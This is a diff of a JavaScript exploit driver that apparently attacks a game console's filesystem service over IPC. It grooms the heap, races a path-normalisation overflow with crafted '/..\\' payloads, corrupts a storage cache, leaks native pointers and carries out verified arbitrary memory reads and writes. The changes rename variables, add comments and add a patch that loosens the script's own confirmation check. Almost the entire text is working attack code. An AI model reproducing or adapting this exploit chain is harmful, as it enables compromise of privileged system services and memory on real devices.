+        payload.write(basename, extentSize_maybe - basename.length);
       } else {
         if (isPositive) {
-          payload.fill('B', 0, extent);
+          payload.fill('B', 0, extentSize_maybe);
           payload.write(selectedDirectory, markerOffset);
-          payload.fill('/', markerOffset + selectedDirectory.length, extent);
+          payload.fill('/', markerOffset + selectedDirectory.length, extentSize_maybe);
         }
         payload.write(isPositive ? '/..\\' : '/../');
-        if (profile === 'address-encoding-control') addressPlan.writes[0].bytes.copy(payload, 0x100);
+        if (profile === 'address-encoding-control')
+          addressPlan.writes[0].bytes.copy(payload, 0x100);
       }
+
+      // break payload into chunsk of 0x800 bytes
       const pieces = [];
-      for (let at = 0; at < payload.length; at += 0x800) pieces.push(payload.subarray(at, at + 0x800));
+      for (let at = 0; at < payload.length; at += 0x800)
+        pieces.push(payload.subarray(at, at + 0x800));
       check(pieces.length === 5, 'Unexpected receive extent');
+
       await s.measure('inputs:' + profile, async () => {
         await put(triggerInput, pieces[0]);
-        for (let i = 0; i < 4; i++) await put(tailInputs[i], pieces[i + 1]);
+        for (let i = 0; i < 4; i++)
+          await put(tailInputs[i], pieces[i + 1]);
         const reads = pieces.map((bytes, i) => ({address: i === 0 ? triggerInput : tailInputs[i - 1], bytes: bytes.length}));
         const actual = (await s.readOwnedMany(reads));
         actual.forEach((bytes, i) => check(bytes.equals(pieces[i]), 'Native input piece differs: ' + i));
       });
+
+      // pick one of tmp or save objects
       const triggerHandle = Buffer.alloc(4);
       triggerHandle.writeUInt32LE(isExtent ? tmpTrigger : savedTrigger);
+
+      // write selected object handle to +0x2a04?
       await s.write(b + 0x2a04, triggerHandle);
-      if (!group) await s.measure('reservation:' + profile, reserveGroup);
-      const packets = [packet(10), packet(0, Buffer.concat([u64(0), u64(readSize)]),
-        {receive: [{address: output, size: readSize, mode: 1}]})];
-      for (let i = 0; i < 4; i++) packets.push(pathPacket(1002, Buffer.alloc(0), tailInputs[i], pieces[i + 1].length));
-      packets.push(pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize), Buffer.from(fillerRequest),
-        Buffer.from(fillerRequest), null, Buffer.from(guardRequest), Buffer.from(guardRequest),
-        pathPacket(7, Buffer.alloc(0), triggerInput, 0x800));
+
+      // this just calls reserveGroup
+      if (!group)
+        await s.measure('reservation:' + profile, reserveGroup);
+
+      const packets = [
+        packet(10),
+        packet(0, Buffer.concat([u64(0), u64(readSize)]), {receive: [{address: output, size: readSize, mode: 1}]})
+      ];
+
+      for (let i = 0; i < 4; i++)
+        packets.push(pathPacket(1002, Buffer.alloc(0), tailInputs[i], pieces[i + 1].length));
+
+      packets.push(
+        pathPacket(7, Buffer.alloc(0), b + 0x40000, canarySize),
+        Buffer.from(fillerRequest),
+        Buffer.from(fillerRequest),
+        null, // why???
+        Buffer.from(guardRequest),
+        Buffer.from(guardRequest),
+        pathPacket(7, Buffer.alloc(0), triggerInput, 0x800)
+      );
+
+      // this is seemingly writing the packets to the game
       await s.measure('requests:' + profile, async () => {
-        const writes = packets.flatMap((bytes, i) => bytes ? [{address: requests[i],
-          bytes: context(bytes, i === 0 || i >= 2 && i < 6 ? 3 : 9)}] : []);
-        writes.push({address: requests[9], bytes: domain.wire.closeObject(group.outer)},
-          {address: preReleaseBuffer, bytes: context(packet(1009))},
-          {address: clearReportBuffer, bytes: context(packet(1009))});
-        writes.push({address: pinBuffer, bytes: context(packet(createPin ? 200 : 1009))});
-        await s.write(requests[0], packPages(requests[0], 16 * 4096, writes));
+        // i = 0,2,3,4,5 -> Token = 3
+        // otherwise -> Token = 9
+        const writes = packets.flatMap((bytes, i) => bytes ? 
+          [{address: threadIpcRequestAddrs[i], bytes: setCmifTokenValue(bytes, i === 0 || i >= 2 && i < 6 ? 3 : 9)}] : []
+        );
+
+        // 1009 = GetAndClearMemoryReportInfo
+        writes.push(
+          {address: threadIpcRequestAddrs[9], bytes: domain.wire.closeObject(group.outer)},
+          {address: preReleaseBuffer, bytes: setCmifTokenValue(packet(1009))},
+          {address: clearReportBuffer, bytes: setCmifTokenValue(packet(1009))}
+        );
+
+        // 1009 = GetAndClearMemoryReportInfo
+        // 200  = OpenDataStorageByCurrentProcess
+        writes.push({address: pinBuffer, bytes: setCmifTokenValue(packet(createPin ? 200 : 1009))});
+
+        await s.write(threadIpcRequestAddrs[0], packPages(threadIpcRequestAddrs[0], 16 * 4096, writes));
       });
+
+      // plans is the sequence of calls
+      console.log('worker count = ' + workers.length)
       await s.measure('workers:' + profile, async () => {
-        if ((workers.length === plans.length)) await native.restartAll(s, workers);
-        else for (let i = 0; i < plans.length; i++) {
-          workers[i] = workers[i] ? await native.restart(s, workers[i]) : await native.start(s,
-            b + 0x100000 + i * 0x40000, 0x40000, b + 0x2000 + i * 16, plans[i],
-            label + '-' + i, b + 0x500000 + i * 0x40000);
+        if ((workers.length === threadFuncCalls.length))
+          await native.restartAll(s, workers);
+        else {
+          for (let i = 0; i < threadFuncCalls.length; i++) {
+            // s, base, limit, slot, calls, label
+            workers[i] = workers[i] ? await native.restart(s, workers[i]) :
+              await native.start(s, b + 0x100000 + i * 0x40000, 0x40000, b + 0x2000 + i * 16, threadFuncCalls[i],
+              label + '-' + i, b + 0x500000 + i * 0x40000);
+          }
         }
         await affinity.pinAll(s, workers, workers.map((_, i) => cores[i % cores.length]));
       });
+
       report.active = {profile, readSize};
-      await save();
+      await repWriter();
       console.log(JSON.stringify({stage: 'prepared', ...report.active, file}));
+
       released = true;
-      await events.signal(s, master);
+      await events.signal(s, masterAddr);
       await s.measure('join:' + profile, async () => {
         await native.joinAll(s, workers);
       });
+
       const firstIpc = workers[0].calls.findIndex(step => step.kind === 'ipc');
       const origin = workers[0].results[firstIpc - 1], rows = [];
       const ipcSteps = workers.flatMap(worker => worker.calls.flatMap((step, index) =>
@@ -427,14 +709,18 @@ async function main() {
       }
       group.outer = null;
       group.objects.length = 0;
-      const after = await memory(), trigger = rows.find(row => row.role === 'trigger');
+      const after = await memory();
+      const trigger = rows.find(row => row.role === 'trigger');
       const heldPaths = rows.filter(row => ['canary', 'filler0', 'filler1', 'guard0', 'guard1'].includes(row.role));
       const beforeRelease = rows.find(row => row.role === 'preRelease');
       const canaryRow = rows.find(row => row.role === 'canary');
-      const guardBytes = await s.readOwned(completedFlag, 32);
-      const nativeGuard = {completed: guardBytes.readUInt32LE(completedDecision - completedFlag),
-        earlyHole: guardBytes.readUInt32LE(holeDecision - completedFlag),
-        minimumSpacing: guardBytes.readUInt32LE(spacingDecision - completedFlag)};
+      const guardBytes = await s.readOwned(completedFlagAddr, 32);
+      const nativeGuard = {
+        completed: guardBytes.readUInt32LE(completedDecisionAddr - completedFlagAddr),
+        earlyHole: guardBytes.readUInt32LE(holeDecisionAddr - completedFlagAddr),
+        minimumSpacing: guardBytes.readUInt32LE(spacingDecision - completedFlagAddr)
+      };
+
       const row = {profile, readSize, extent: payload.length - 1, rows,
         nativeGuard, triggerAborted: Boolean(nativeGuard.completed || nativeGuard.earlyHole || nativeGuard.minimumSpacing),
         receiveOrderMarginUs: rows.find(r => r.role === 'hole').endUs - rows.find(r => r.role === 'guard1').startUs,
@@ -448,22 +734,25 @@ async function main() {
           r.role === 'canary' && Buffer.from(r.inline, 'hex').readUInt32LE() !== 1).map(r => r.role),
         canaryResult: canaryRow.result,
         canaryType: canaryRow.result ? null : Buffer.from(canaryRow.inline, 'hex').readUInt32LE()};
+
       report.cases.push(row);
       delete report.active;
-      await save();
+      await repWriter();
       console.log(JSON.stringify(row));
       if (candidateHandle && !row.restored) {
         report.placementUncertain = true;
         report.heapDrift = {profile, expected: row.baseline, observed: row.after,
           difference: row.after - row.baseline};
-        await save();
+        await repWriter();
         throw Error('General-heap allocation changed while the cache was retained; stop overwrites and recover');
       }
+
       if ((isPositive || customPayload) && !row.triggerAborted && !row.allPending) {
         report.placementUncertain = true;
-        await save();
+        await repWriter();
         throw Error('A protected request ended during the overwrite; retain resources for recovery');
       }
+
       await closeGroup();
       if (createPin) {
         const pinRow = rows.find(r => r.role === 'pin');
@@ -471,6 +760,7 @@ async function main() {
           'Pinning storage was not created while the canary was pending');
         check(row.newPersistentBytes === 13616, 'Pinning allocation cost changed');
       }
+
       check(rows.find(r => r.role === 'pin').result === 0, 'Pinning request failed');
       check(rows.filter(r => ['commit', 'hole', 'clearReport', 'preRelease'].includes(r.role)).every(r => r.result === 0), 'Ordinary gap request failed');
       check(rows.filter(r => r.role.startsWith('tail')).every(r => r.result === 0x320002), 'Deferred seed result differs');
@@ -483,17 +773,18 @@ async function main() {
       // caller retry this measured miss after checking the file below.
       if (!isPositive && !metadataCanaryMiss)
         check(!canaryRow.result && row.canaryType === 1, 'Control changed the canary');
-      if (row.triggerAborted) check(trigger.result === report.abortControlResult, 'Native abort differs from the empty-path control');
+      if (row.triggerAborted)
+        check(trigger.result === report.abortControlResult, 'Native abort differs from the empty-path control');
       else if (profile === 'binary-control') check([0x2eea02, 0x2eec02].includes(trigger.result), 'Unexpected binary-path result');
       else if (!isExtent) check(trigger.result === 0x2eec02, 'Backslash control result differs');
-      const health = await normal(saved, 7, canary);
+      const health = await normal(saveFsHandle, 7, canary);
       check(!health.result && health.data.readUInt32LE() === 1, 'Canary file changed on disk');
       row.host = {elapsedMs: performance.now() - hostStarted, requests: s.metrics.requests - hostRequests};
       await s.record({operation: 'waveTiming', profile, ...row.host,
         nativeElapsedMs: Math.max(...rows.map(row => row.endUs)) / 1000});
       await runControl.end(profile);
       return row;
-    }
+    } // wave done here
 
     const hasWindow = row => row.restored && !row.triggerAborted && row.allPending && row.receiveOrderMarginUs >= 300 &&
       row.preReleaseUsed >= 0x2600;
@@ -525,7 +816,9 @@ async function main() {
     const result = await retryWave('extent-present');
     const qualified = result.selectedMarker && hasWindow(result) ? probeReadSize : null;
     report.qualifiedReadSize = qualified || null;
+
     if (qualified) {
+
       const control = await retryWave('negative');
       if (hasWindow(control)) {
         const positive = await retryWave('positive');
@@ -533,11 +826,13 @@ async function main() {
           positive.receiveOrderMarginUs >= 300;
         report.markerSelected = (report.canaryChanged) && positive.canaryType === 0 &&
           positive.changedPaths.every(name => name === 'canary') && hasWindow(positive);
+
         if ((!positive.triggerAborted) && !report.markerSelected) {
           report.placementUncertain = true;
-          await save();
+          await repWriter();
           throw Error('Overwrite missed the qualified canary; retain resources for recovery');
         }
+
         // The locator already traversed and checked the full input extent.
         // Keep its allocation sequence intact through the directory controls.
         await checkExtent();
@@ -547,11 +842,12 @@ async function main() {
             repeated.changedPaths.every(name => name === 'canary') && hasWindow(repeated);
           if (!repeated.triggerAborted && !report.markerReproduced) {
             report.placementUncertain = true;
-            await save();
+            await repWriter();
             throw Error('Repeated overwrite missed the canary; retain resources for recovery');
           }
           await checkExtent();
         }
+
         if (addressPlan && report.markerReproduced) {
           const encoded = await retryWave('address-encoding-control');
           report.cacheAddress.encodingControl = {copied: hasWindow(encoded) && encoded.canaryType === 0,
@@ -559,6 +855,7 @@ async function main() {
           check(report.cacheAddress.encodingControl.copied, 'The encoded pointer prefix did not reach the native marker');
           await checkExtent();
         }
+
         if ((report.markerReproduced)) {
           const aliasOffset = (0x1400000);
           const leakOffset = (aliasOffset);
@@ -574,20 +871,21 @@ async function main() {
             const bytes = size >= 0x8000 ? await bulk.read(s, output, size) : await s.readOwned(output, size);
             return {result: reply.canonicalResult, bytes};
           }
+
           const controlSize = Math.max(0x8000, cacheReadSize);
-          const control = await readStorage(storage, controlSize);
+          const control = await readStorage(romStorage, controlSize);
           check(!control.result, 'Cache-range content control failed');
           cache.controlFile = path.join(__dirname, label + '-range-control.bin');
           await fs.writeFile(cache.controlFile, control.bytes, {mode: 0o600});
           cache.controlSha256 = hash(control.bytes);
-          const aliasControl = await readStorage(storage, 16, aliasOffset);
+          const aliasControl = await readStorage(romStorage, 16, aliasOffset);
           check(!aliasControl.result && !aliasControl.bytes.equals(control.bytes.subarray(0, 16)),
             'Alias control does not distinguish the two offsets');
           cache.aliasControlHex = aliasControl.bytes.toString('hex');
           cache.expectedAliasHex = control.bytes.subarray(0, 16).toString('hex');
           await reserveGroup();
           const beforeCandidate = await memory();
-          candidateHandle = domain.oneHandle(await s.ipc('Reuse the canary slot with own content', root, 200));
+          candidateHandle = domain.oneHandle(await s.ipc('Reuse the canary slot with own content', fspHandle, 200));
           const prime = await readStorage(candidateHandle, 16);
           check(!prime.result && prime.bytes.equals(control.bytes.subarray(0, 16)), 'Candidate content differs');
           const afterCandidate = await memory();
@@ -595,7 +893,7 @@ async function main() {
           group.before[5] -= cache.allocationBytes;
           group.held[5] -= cache.allocationBytes;
           check(cache.allocationBytes === 13616, 'Candidate allocation cost differs');
-          await save();
+          await repWriter();
 
           const ownerControls = [];
           async function copyField(tail, name, requiredCopies = fieldCopies) {
@@ -606,6 +904,7 @@ async function main() {
             tail.copy(bytes, markerOffset);
             bytes[bytes.length - 1] = 0;
             for (let batch = 0; ; batch++) {
+              // PATCH: quit after the first "accepted" run
               let confirmed = 0;
               for (let attempt = 0; attempt < requiredCopies * 3 && confirmed < requiredCopies; attempt++) {
                 const row = await wave('cache-' + name + '-' + batch + '-' + attempt, qualified, bytes);
@@ -614,9 +913,12 @@ async function main() {
                 // accepted window. Count accepted windows without requiring
                 // consecutive placement; native readback remains the proof.
                 const accepted = hasWindow(row) && row.preReleaseUsed >= minimumCacheHeld && row.changedPaths.length === 0;
-                if (accepted) confirmed++;
+                if (accepted) {
+                  confirmed++;
+                  break;
+                }
               }
-              if (confirmed === requiredCopies) break;
+              if (confirmed !== 0) break;
               check(runControl.state.mode !== 'retiring', 'Cleanup field copies did not retain the required receive order');
               throw Error('Field copy did not qualify within its attempt limit: ' + name);
             }
@@ -644,18 +946,18 @@ async function main() {
               const reset = await s.ipc('Reset the clean alias cache', candidateHandle, 5,
                 Buffer.concat([u64(2), u64(0), u64(storageSize)]));
               (cache.invalidateResults ||= []).push(reset.canonicalResult);
-              await save();
+              await repWriter();
               check(!reset.result, 'Clean alias cache invalidation failed');
             }
             const restored = await readStorage(candidateHandle, 16);
             cache.restoredPrefix = !restored.result && restored.bytes.equals(prime.bytes);
             (cache.restoreChecks ||= []).push({result: restored.result,
               observedHex: restored.bytes?.toString('hex'), matches: cache.restoredPrefix});
-            await save();
+            await repWriter();
             check(cache.restoredPrefix, 'Candidate prefix changed after restoration');
             cacheNeedsRestore = false;
             cache.restored = true;
-            await save();
+            await repWriter();
           };
           restoreCandidate = restoreAlias;
           cache.attempts = [];
@@ -664,7 +966,7 @@ async function main() {
               throw Error('Clean alias did not qualify within its attempt limit');
             }
             cacheNeedsRestore = true;
-            await save();
+            await repWriter();
             await installCombinedLeak('combined-leak-' + attempt);
             const aliased = await readStorage(candidateHandle, 16, aliasOffset);
             cache.readResult = aliased.result;
@@ -681,7 +983,7 @@ async function main() {
             cache.attempts.push({attempt, result: aliased.result, observedHex: aliased.bytes?.toString('hex'),
               selectedAlias: cache.selectedAlias, normalContent: cache.normalContent,
               outputFile: aliased.bytes ? cache.outputFile : null});
-            await save();
+            await repWriter();
             // Keep this exact entry and buffer for the extended read. An
             // ordinary-content miss still takes the existing restore path.
             if ((!cache.selectedAlias)) await restoreCandidate();
@@ -709,10 +1011,10 @@ async function main() {
                 range.invalidated = true;
               }
               cacheNeedsRestore = false;
-              await save();
+              await repWriter();
             };
             cacheNeedsRestore = true;
-            await save();
+            await repWriter();
             {
               range.attempts = [];
               for (let attempt = 0; ; attempt++) {
@@ -720,7 +1022,7 @@ async function main() {
                   throw Error('Clean range did not qualify within its attempt limit');
                 }
                 cacheNeedsRestore = true;
-                await save();
+                await repWriter();
                 {
                   if (attempt) await installCombinedLeak('combined-expand-retry-' + attempt);
                 }
@@ -740,7 +1042,7 @@ async function main() {
                   prefixMatches: range.beforeReleasePrefixMatches, firstDifference: range.beforeReleaseFirstDifference,
                   outputFile: beforeRelease.bytes ? range.beforeReleaseFile : null,
                   sha256: beforeRelease.bytes ? range.beforeReleaseSha256 : null});
-                await save();
+                await repWriter();
                 // Adjacent cached blocks can match ordinary content too.
                 // Require a matching first block and a later real difference;
                 // do not require that difference at exactly byte 0x4000.
@@ -752,17 +1054,17 @@ async function main() {
               const releasedCaches = range.releasedCaches = {before: await memory(), results: []};
               // These owners are all read-only content storages. Their cache
               // buffers can be freed without closing any app-owned object.
-              for (const handle of new Set([storage, pinHandle, ...storages, originalRom].filter(Boolean))) {
+              for (const handle of new Set([romStorage, pinHandle, ...storages, romfsHandle].filter(Boolean))) {
                 check(handle !== candidateHandle, 'Cannot invalidate the active leak owner');
                 const reply = await s.ipc('Release neighboring clean content cache', handle, 5,
                   Buffer.concat([u64(2), u64(0), u64(storageSize)]));
                 releasedCaches.results.push({handle, result: reply.canonicalResult});
-                await save();
+                await repWriter();
                 check(!reply.result, 'Neighboring clean cache invalidation failed');
               }
               releasedCaches.after = await memory();
               releasedCaches.delta = releasedCaches.after.map((value, i) => value - releasedCaches.before[i]);
-              await save();
+              await repWriter();
               check(releasedCaches.delta[5] === 0, 'Neighbor invalidation changed general-heap geometry');
             }
             const widened = await readStorage(candidateHandle, cacheReadSize, leakOffset);
@@ -774,12 +1076,12 @@ async function main() {
               range.firstDifference = widened.bytes.findIndex((byte, i) => byte !== control.bytes[i]);
               range.prefixMatches = widened.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000));
             }
-            await save();
+            await repWriter();
             if ((widened.bytes) && range.prefixMatches && range.firstDifference >= 0x4000) {
               range.earlyLinkCandidates = await nativeLinks(range);
               range.fragmentationSkipped = range.earlyLinkCandidates.some(item =>
                 item.encodable && (item.changedLink || item.zeroTail || item.zeroAfter32));
-              await save();
+              await repWriter();
             }
             if (!range.fragmentationSkipped && (16) &&
                 widened.bytes && range.prefixMatches && range.firstDifference >= 0x4000) {
@@ -794,7 +1096,7 @@ async function main() {
                   prefixMatches: read.bytes.subarray(0, 0x4000).equals(control.bytes.subarray(0, 0x4000)),
                   memory: await memory()};
                 range.fragmentation.push(item);
-                await save();
+                await repWriter();
                 check(item.prefixMatches && item.firstDifference >= 0x4000,
                   'The widened candidate was replaced during fragmentation');
               }
@@ -825,13 +1127,14 @@ async function main() {
             await restoreCandidate();
             range.completed = true;
           }
+
           if ((cache.selectedAlias)) {
             const range = report.cacheRange;
             check(range?.completed && range.readResult === 0 && range.prefixMatches && range.firstDifference >= 0x4000,
               'Combined acquisition needs a qualified native over-read');
             const candidates = await nativeLinks(range);
             report.linkCandidates = candidates;
-            await save();
+            await repWriter();
             const selected = candidates.find(item => item.encodable);
             check(selected, 'The bounded native leak contains no qualified, encodable link candidate');
             const evidence = {session: live.session, target: '0x' + selected.target.toString(16),
@@ -849,33 +1152,33 @@ async function main() {
             // A short input exercises native UTF-8 validation without an
             // overflow. Requalify the owned cache after these ordinary calls.
             const prefix = Buffer.from('/..\\');
-            const invalid = await raw(saved, 7, Buffer.concat([prefix, Buffer.from([0xff, 0])]));
+            const invalid = await raw(saveFsHandle, 7, Buffer.concat([prefix, Buffer.from([0xff, 0])]));
             const encodedBytes = Buffer.concat([prefix, addressPlan.writes[0].bytes, Buffer.from([0])]);
-            const encoded = await raw(saved, 7, encodedBytes);
+            const encoded = await raw(saveFsHandle, 7, encodedBytes);
             const inputMatches = (await s.readOwned(b + 0x4000, encodedBytes.length)).equals(encodedBytes);
             report.cacheAddress.encodingControl = {kind: 'bounded-native-normalizer',
               invalidResult: invalid.canonicalResult, acceptedResult: encoded.canonicalResult, inputMatches,
               accepted: invalid.canonicalResult === 0x2eea02 && encoded.canonicalResult === 0x2eec02 && inputMatches};
-            await save();
+            await repWriter();
             check(report.cacheAddress.encodingControl.accepted, 'Native pointer encoding control failed');
 
             const reprime = await readStorage(candidateHandle, 16);
             check(!reprime.result && reprime.bytes.equals(prime.bytes), 'Candidate prefix differs before requalification');
             restoreCandidate = restoreAlias;
             cacheNeedsRestore = true;
-            await save();
+            await repWriter();
             await setAliasOffset('address-alias-offset');
             const selectedAgain = await readStorage(candidateHandle, 16, aliasOffset);
             report.cacheAddress.aliasRequalification = {result: selectedAgain.result,
               observedHex: selectedAgain.bytes?.toString('hex'),
               selected: !selectedAgain.result && selectedAgain.bytes.equals(prime.bytes)};
-            await save();
+            await repWriter();
             await restoreCandidate();
             check(report.cacheAddress.aliasRequalification.selected, 'The owned cache alias did not survive address preparation');
           }
           if ((cache.selectedAlias) && report.cacheAddress.periodControlHex !== prime.bytes.toString('hex')) {
             cacheNeedsRestore = true;
-            await save();
+            await repWriter();
             await copyField(Buffer.from([0xc2, 0x80, 0x02]), 'period-offset-3');
             await copyField(Buffer.alloc(0), 'period-offset-0');
             const period = await readStorage(candidateHandle, 16, 0x28000);
@@ -912,10 +1215,10 @@ async function main() {
                 address.restoreSha256 = hash(restored.bytes);
               }
               address.memoryRestored = !restored.result && restored.bytes.equals(original);
-              await save();
+              await repWriter();
               check(address.memoryRestored, 'Selected memory differs after restoration');
               memoryNeedsRestore = false;
-              await save();
+              await repWriter();
             }
             // Never flush or invalidate a redirected dirty entry. Clearing
             // its valid byte makes finalization skip the synthetic pointer.
@@ -925,17 +1228,17 @@ async function main() {
                 await require("../retained/retained-memory.cjs").retire(memoryContext);
                 address.retired = true;
                 cacheNeedsRestore = false;
-                await save();
+                await repWriter();
                 return;
               }
               await restoreMemory();
               await copyField(Buffer.alloc(0x10, 'B'), 'retire-address-entry');
               address.retired = true;
               cacheNeedsRestore = false;
-              await save();
+              await repWriter();
             };
             cacheNeedsRestore = true;
-            await save();
+            await repWriter();
             for (const step of addressPlan.writes) await copyField(step.bytes, 'address-header-' + step.end);
             const first = await readStorage(candidateHandle, length, addressPlan.readOffset, 0xa5);
             const second = await readStorage(candidateHandle, length, addressPlan.readOffset, 0x5a);
@@ -954,7 +1257,7 @@ async function main() {
               address.first64Hex = first.bytes.subarray(0, 64).toString('hex');
             }
             address.readVerified = !first.result && !second.result && address.repeatMatches && address.differsFromContent;
-            await save();
+            await repWriter();
             check(address.readVerified, 'The native address read did not pass both poison and content controls');
             {
               original = first.bytes;
@@ -965,7 +1268,7 @@ async function main() {
               memoryNeedsRestore = true;
               address.writeAddress = addressPlan.target + writeOffset;
               address.writeMarker = marker.toString('hex');
-              await save();
+              await repWriter();
               address.writeResult = await writeWindow(marker);
               check(!address.writeResult, 'Selected memory write failed');
               const changed = await readStorage(candidateHandle, length, addressPlan.readOffset);
@@ -975,17 +1278,17 @@ async function main() {
                 await fs.writeFile(address.writeOutputFile, changed.bytes, {mode: 0o600});
                 address.writeOutputSha256 = hash(changed.bytes);
               }
-              await save();
+              await repWriter();
               check(address.writeVerified, 'Selected memory write or neighboring bytes differ');
               await restoreMemory();
               address.savedProof = await require('./verify-proof.cjs').verifyProof(file, live.session);
-              await save();
+              await repWriter();
             }
             {
               const controller = require("./fs-memory-control.cjs");
               await fs.copyFile(path.join(__dirname, 'fs-memory-control.cjs'),
                 path.join(__dirname, label + '-memory-control-source.cjs'));
-              memoryContext = {s, live, report, file, label, save, storageSize: Number(storageSize),
+              memoryContext = {s, live, report, file, label, save: repWriter, storageSize: Number(storageSize),
                 initialPlan: addressPlan, copyField, readStorage, candidateHandle, input: b + 0xb0000, put,
                 runControl};
               await controller.serve(memoryContext);
@@ -995,7 +1298,7 @@ async function main() {
           }
           await s.close(candidateHandle);
           candidateHandle = null;
-          const fresh = domain.oneHandle(await s.ipc('Verify content with a fresh storage', root, 200));
+          const fresh = domain.oneHandle(await s.ipc('Verify content with a fresh storage', fspHandle, 200));
           const verified = await readStorage(fresh, controlSize);
           cache.backingUnchanged = !verified.result && verified.bytes.equals(control.bytes);
           const verifiedAlias = await readStorage(fresh, 16, aliasOffset);
@@ -1013,6 +1316,8 @@ async function main() {
       } else report.skipped = 'Negative control did not retain all paths in the required order';
     }
     report.completed = true;
+
+  // All done here :)
   } catch (error) {
     if (error instanceof StopRequested) report.stopped = true;
     else {
@@ -1025,7 +1330,7 @@ async function main() {
             report.workerCaptureFile = path.join(__dirname, label + '-worker-failure.json');
             await fs.writeFile(report.workerCaptureFile, JSON.stringify(capture, null, 2) + '\n', {mode: 0o600});
           } catch (captureError) {report.workerCaptureError = captureError.stack;}
-          await save();
+          await repWriter();
         }
         console.log(JSON.stringify({stage: ('bounded-failure'), file, error: error.message}));
       }
@@ -1038,7 +1343,7 @@ async function main() {
         const parked = workers.filter(worker => !worker.joined && s.threads.has(worker.thread));
         for (const worker of parked) await s.rpc.store64(worker.base + worker.tablesOffset +
           worker.logicalResultIndices[1] * 0x100 + 0x78, BigInt(live.sdk + code.exit.offset));
-        for (const gate of gates) await events.signal(s, gate);
+        for (const gate of eventList) await events.signal(s, gate);
         for (const worker of parked) {
           const until = Date.now() + 5000;
           while (!await s.rpc.call3(live.sdk + code.tryWait.offset, worker.thread, 0, 0))
@@ -1054,7 +1359,7 @@ async function main() {
         catch (error) {report.cacheRestoreError = error.stack; process.exitCode = 1;}
       }
       if (!report.placementUncertain && !s.threads.size && !cacheNeedsRestore && await s.ready()) {
-        if (fileHandle && s.handles.has(fileHandle)) await s.close(fileHandle);
+        if (commitDataFileHandle && s.handles.has(commitDataFileHandle)) await s.close(commitDataFileHandle);
         await closeGroup();
         for (const item of [...created].reverse()) {
           check(!(await normal(item.handle, 4, item.path)).result, 'Gap scratch removal failed');
@@ -1062,7 +1367,7 @@ async function main() {
           check((await normal(item.handle, 7, item.path)).canonicalResult === 0x202, 'Gap scratch remains');
           created.splice(created.indexOf(item), 1);
         }
-        for (const gate of gates) await events.finalize(s, gate);
+        for (const gate of eventList) await events.finalize(s, gate);
         await s.cleanup();
       }
     } catch (error) {report.cleanupError = error.stack; process.exitCode = 1;}
@@ -1070,7 +1375,7 @@ async function main() {
     report.cleanedUp = !s.base && !s.handles.size && !s.threads.size && !created.length && !group;
     report.finished = new Date().toISOString();
     await runControl.close();
-    await save();
+    await repWriter();
     console.log(JSON.stringify({file, completed: report.completed, cleanedUp: report.cleanedUp,
       qualifiedReadSize: report.qualifiedReadSize, error: report.error, cleanupError: report.cleanupError}));
   }
